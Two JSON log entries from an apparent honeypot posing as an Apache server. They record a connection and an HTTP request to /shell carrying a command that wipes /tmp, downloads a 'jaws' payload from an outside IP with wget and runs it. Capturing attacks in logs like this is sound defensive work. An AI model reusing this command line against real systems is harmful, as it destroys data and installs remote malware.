{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-01T08:59:04.455625","parsedMessage":{"timestamp":"2023-03-01 08:59:04.455625","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 143.42.134.83:56377 to port 80","ip":"143.42.134.83"},"id":"6b0659b8-d19f-49bf-bf2d-f433b6e11336","EventProcessedUtcTime":"2023-03-01T08:59:04.8836984Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-01T08:59:04.6930000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/143.42.134.83"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Wed Mar  1 09:00:02 UTC 2023","parsedMessage":{"timestamp":"2023-03-01 08:59:04+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"143.42.134.83 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"143.42.134.83"},"id":"50a1b588-ac24-461d-a36e-c7827b887054","EventProcessedUtcTime":"2023-03-01T09:00:04.5083509Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-01T09:00:04.2930000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/143.42.134.83"}